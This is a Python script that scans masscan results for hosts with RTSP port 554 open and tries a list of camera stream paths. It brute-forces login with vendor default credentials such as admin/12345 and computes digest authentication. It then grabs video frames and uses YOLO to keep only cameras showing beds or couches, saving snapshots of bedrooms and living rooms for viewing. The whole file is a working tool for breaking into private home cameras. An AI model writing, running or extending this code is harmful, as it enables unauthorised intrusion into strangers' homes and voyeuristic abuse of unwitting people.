#!/usr/bin/env python3
"""
TITAN YOLO ROOM HUNTER v4 — MASSCAN STREAMING CONSUMER
Reads from growing masscan_fresh_554.txt, processes IPs through P2→P3.
No P1 needed — masscan already confirmed port 554 is open.
15 RTSP paths, 10 credential sets, batch processing.
"""

import asyncio, hashlib, json, os, re, subprocess, sys, time, random, shutil
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

BASE = Path(__file__).resolve().parent
RESULTS = BASE / "results"
FRAMES = BASE / "yolo_frames"
SNAPS = BASE / "web_snapshots"
MASSCAN_FRESH = BASE / "masscan_fresh_554.txt"
for d in [RESULTS, FRAMES, SNAPS]:
    d.mkdir(exist_ok=True)

# RTSP paths — ordered by popularity (most common first)
PATHS_NOAUTH = [
    "/",                                        # XMeye/Xiongmai/generic
    "/stream1",                                 # Generic
    "/live",                                    # Generic
    "/live/ch00_0",                             # Generic
    "/h264Preview_01_main",                     # Reolink
    "/videoMain",                               # Foscam
    "/0",                                       # Grandstream
    "/media/video1",                            # Generic
    "/onvif1",                                  # ONVIF
    "/live.sdp",                                # Vivotek
    "/s0",                                      # Ubiquiti
    "/main",                                    # Generic
    "/h264/ch1/main/av_stream",                 # Hikvision
    "/axis-media/media.amp",                    # Axis
    "/11",                                      # Foscam/Chinese
]

PATHS_AUTH = [
    "/Streaming/Channels/101",                  # Hikvision
    "/cam/realmonitor?channel=1&subtype=0",     # Dahua
    "/Streaming/Channels/1",                    # Hikvision alt
    "/ISAPI/Streaming/channels/101",            # Hikvision ISAPI
    "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=Onvif",  # Amcrest
    "/h264/ch1/main/av_stream",                 # HikAuth
]

CREDS = [
    ("admin", ""),           # Hikvision older
    ("admin", "12345"),      # Hikvision default
    ("admin", "admin"),      # Generic
    ("admin", "123456"),     # Dahua default
    ("admin", "888888"),     # Chinese brands
    ("admin", "1234"),       # Many generics
    ("admin", "password"),   # Generic
    ("root", ""),            # Axis/Vivotek
    ("root", "pass"),        # Axis  
    ("admin", "Admin123"),   # Hikvision newer
]

ROOM_CLASSES = {59: "bed", 57: "couch", 56: "chair", 62: "tv", 61: "toilet"}
PRIMARY = {"bed", "couch"}
CONF = 0.20  # lowered from 0.25 for more catches
TARGET = 100

PROCESSED = set()
FOUND = OrderedDict()


def load_existing():
    """Load already-found rooms and known IPs to skip."""
    # Load existing rooms
    p = RESULTS / "yolo_rooms.json"
    if p.exists():
        try:
            d = json.load(open(p))
            for s in d.get("streams", []):
                ip = s.get("ip", "")
                if ip:
                    FOUND[ip] = s
                    PROCESSED.add(ip)
        except:
            pass

    # Load known IPs from other result files
    for fn in ["live_streams.json", "rtsp_blitz_live.json"]:
        fp = RESULTS / fn
        if not fp.exists():
            continue
        try:
            d = json.load(open(fp))
            for s in (d.get("streams", []) if isinstance(d, dict) else d):
                PROCESSED.add(s.get("ip", ""))
        except:
            pass
    print(f"[INIT] {len(FOUND)} existing rooms, {len(PROCESSED)} known IPs")


def read_new_ips():
    """Read new IPs from masscan output file that haven't been processed yet."""
    if not MASSCAN_FRESH.exists():
        return []
    new = []
    with open(MASSCAN_FRESH) as f:
        for line in f:
            if not line.startswith("open"):
                continue
            parts = line.strip().split()
            if len(parts) >= 4:
                ip = parts[3]
                if ip not in PROCESSED:
                    new.append(ip)
                    PROCESSED.add(ip)
    return new


# ══════════════════════════════════════════════
# P2: DESCRIBE — get stream URLs (skip P1, masscan confirmed port open)
# ══════════════════════════════════════════════

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


async def describe(ip, path, user="", pw=""):
    url = f"rtsp://{ip}:554{path}"
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), timeout=3)
        req = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n"
        w.write(req.encode())
        await w.drain()
        data = (await asyncio.wait_for(r.read(4096), timeout=3)).decode(errors="ignore")

        if "200 OK" in data and ("m=video" in data or "a=control" in data):
            w.close()
            u = f"rtsp://{ip}:554{path}" if not user else f"rtsp://{user}:{pw}@{ip}:554{path}"
            return {"ip": ip, "port": 554, "path": path, "user": user, "password": pw,
                    "auth": "none" if not user else "digest", "rtsp_url": u}

        if "401" in data and "Digest" in data and user:
            rm = re.search(r'realm="([^"]*)"', data)
            nm = re.search(r'nonce="([^"]*)"', data)
            if rm and nm:
                ha1 = md5(f"{user}:{rm.group(1)}:{pw}")
                ha2 = md5(f"DESCRIBE:{url}")
                resp = md5(f"{ha1}:{nm.group(1)}:{ha2}")
                auth = f'Digest username="{user}",realm="{rm.group(1)}",nonce="{nm.group(1)}",uri="{url}",response="{resp}"'
                w.write(f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\n\r\n".encode())
                await w.drain()
                d2 = (await asyncio.wait_for(r.read(4096), timeout=3)).decode(errors="ignore")
                if "200 OK" in d2:
                    w.close()
                    return {"ip": ip, "port": 554, "path": path, "user": user, "password": pw,
                            "auth": "digest", "rtsp_url": f"rtsp://{user}:{pw}@{ip}:554{path}"}
        w.close()
    except:
        pass
    return None


async def quick_describe(ip, path, user="", pw=""):
    """Fast DESCRIBE — single attempt, 2s timeout."""
    url = f"rtsp://{ip}:554{path}"
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), timeout=2)
        req = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n"
        w.write(req.encode())
        await w.drain()
        data = (await asyncio.wait_for(r.read(4096), timeout=2)).decode(errors="ignore")
        w.close()

        if "200 OK" in data and ("m=video" in data or "a=control" in data):
            u = f"rtsp://{ip}:554{path}" if not user else f"rtsp://{user}:{pw}@{ip}:554{path}"
            return {"ip": ip, "port": 554, "path": path, "user": user, "password": pw,
                    "auth": "none" if not user else "digest", "rtsp_url": u}

        if "401" in data:
            return "AUTH_NEEDED"
    except:
        pass
    return None


async def probe_host(ip, sem):
    """Fast 2-tier probe: quick no-auth, then targeted auth if 401."""
    async with sem:
        needs_auth = False

        # TIER 1: Quick no-auth (top 5 paths, single connection each)
        for p in ["/", "/stream1", "/live", "/h264Preview_01_main", "/0"]:
            r = await quick_describe(ip, p)
            if isinstance(r, dict):
                return r
            if r == "AUTH_NEEDED":
                needs_auth = True
                break

        if not needs_auth:
            return None

        # TIER 2: Auth needed — try top 2 paths × top 4 creds
        for p in ["/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0"]:
            for u, pw in [("admin", "12345"), ("admin", "admin"), ("admin", ""), ("admin", "123456")]:
                r = await describe(ip, p, u, pw)
                if isinstance(r, dict):
                    return r
    return None


async def phase2(ips, sem):
    """DESCRIBE phase — find valid RTSP streams."""
    t0 = time.time()
    streams = []
    CHUNK = 5000
    for i in range(0, len(ips), CHUNK):
        chunk = ips[i:i + CHUNK]
        results = await asyncio.gather(
            *[probe_host(ip, sem) for ip in chunk],
            return_exceptions=True
        )
        for r in results:
            if isinstance(r, dict):
                streams.append(r)
        elapsed = time.time() - t0
        print(f"  [{min(i + CHUNK, len(ips))}/{len(ips)}] {len(streams)} streams ({elapsed:.0f}s)")
    print(f"[P2] {len(streams)} valid streams from {len(ips)} IPs in {time.time() - t0:.0f}s")
    return streams


# ══════════════════════════════════════════════
# P3: FRAME GRAB + YOLO
# ══════════════════════════════════════════════

_model = None


def yolo():
    global _model
    if not _model:
        from ultralytics import YOLO
        _model = YOLO(str(BASE.parent / "yolov8n.pt"))
    return _model


def grab(cam):
    ip, url = cam["ip"], cam["rtsp_url"]
    out = FRAMES / f"{ip.replace('.', '_')}.jpg"
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-timeout", "5000000",
             "-i", url, "-frames:v", "1", "-update", "1",
             "-vf", "scale=640:-1", "-q:v", "3", str(out)],
            capture_output=True, timeout=12)
        if r.returncode == 0 and out.exists() and out.stat().st_size > 800:
            return cam, str(out)
    except:
        pass
    return cam, None


def phase3(streams):
    """Frame grab + YOLO detection on streams."""
    print(f"\n[P3] Frame grab + YOLO on {len(streams)} streams...")
    model = yolo()

    # Grab frames (20 parallel)
    t0 = time.time()
    grabbed = []
    with ThreadPoolExecutor(max_workers=20) as pool:
        for cam, path in pool.map(grab, streams):
            if path:
                grabbed.append((cam, path))

    print(f"  {len(grabbed)}/{len(streams)} frames grabbed in {time.time() - t0:.0f}s")
    if not grabbed:
        return 0

    # Batch YOLO
    t1 = time.time()
    paths = [p for _, p in grabbed]
    cams = [c for c, _ in grabbed]
    results = model(paths, verbose=False, conf=CONF)

    new = 0
    for cam, result in zip(cams, results):
        ip = cam["ip"]
        if ip in FOUND:
            continue

        dets = []
        for box in result.boxes:
            cid = int(box.cls[0])
            name = ROOM_CLASSES.get(cid)
            if name:
                dets.append({"name": name, "conf": round(float(box.conf[0]), 3)})

        names = {d["name"] for d in dets}
        if names & PRIMARY:
            room = "bedroom" if "bed" in names else "living_room"
            cam["yolo_tags"] = list(names)
            cam["yolo_conf"] = max(d["conf"] for d in dets)
            cam["room"] = room
            FOUND[ip] = cam
            new += 1

            # Copy frame to web_snapshots for viewer
            safe = ip.replace(".", "_")
            src = FRAMES / f"{safe}.jpg"
            if src.exists():
                try:
                    shutil.copy2(src, SNAPS / f"{safe}.jpg")
                except:
                    pass

            tags = ", ".join(f"{d['name']}({d['conf']:.0%})" for d in dets)
            print(f"  *** ROOM #{len(FOUND)}: {ip} [{room}] — {tags}")
            save()

            if len(FOUND) >= TARGET:
                break

    print(f"[P3] +{new} rooms in {time.time() - t1:.0f}s | Total: {len(FOUND)}/{TARGET}")
    return new


def save():
    streams = []
    for s in FOUND.values():
        c = {k: v for k, v in s.items() if k != "sdp_snippet"}
        streams.append(c)
    with open(RESULTS / "yolo_rooms.json", "w") as f:
        json.dump({"streams": streams, "count": len(streams),
                    "updated": time.strftime("%Y-%m-%d %H:%M:%S")}, f, indent=2)


async def main():
    global TARGET
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", type=int, default=100)
    ap.add_argument("--sem", type=int, default=5000)
    ap.add_argument("--batch", type=int, default=50000, help="IPs per batch")
    ap.add_argument("--wait", type=int, default=20, help="Seconds between file reads")
    args = ap.parse_args()
    TARGET = args.target

    print(f"{'=' * 60}")
    print(f"  TITAN YOLO ROOM HUNTER v4 — MASSCAN STREAMING CONSUMER")
    print(f"  Target: {TARGET} bed/couch cameras")
    print(f"  Source: {MASSCAN_FRESH}")
    print(f"{'=' * 60}\n")

    load_existing()
    yolo()  # pre-load model

    sem = asyncio.Semaphore(args.sem)
    batch_num = 0
    stale_count = 0

    while len(FOUND) < TARGET:
        new_ips = read_new_ips()

        if not new_ips:
            stale_count += 1
            if stale_count > 15:
                print(f"\n[!] No new IPs for {stale_count * args.wait}s — masscan may be done")
                break
            print(f"[WAIT] No new IPs, checking in {args.wait}s... (total processed: {len(PROCESSED)})")
            await asyncio.sleep(args.wait)
            continue

        stale_count = 0
        batch_num += 1

        # Process in batches
        for batch_start in range(0, len(new_ips), args.batch):
            batch = new_ips[batch_start:batch_start + args.batch]
            print(f"\n[BATCH {batch_num}.{batch_start // args.batch + 1}] {len(batch)} fresh masscan IPs")

            # P2: DESCRIBE (skip P1 — masscan confirmed port 554 open)
            streams = await phase2(batch, sem)
            if not streams:
                print("[!] No streams in this batch")
                continue

            # P3: YOLO
            phase3(streams)

            if len(FOUND) >= TARGET:
                break

        if len(FOUND) >= TARGET:
            break

    save()
    print(f"\n{'=' * 60}")
    print(f"  DONE: {len(FOUND)} room cameras (target: {TARGET})")
    print(f"  Results: {RESULTS / 'yolo_rooms.json'}")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    asyncio.run(main())
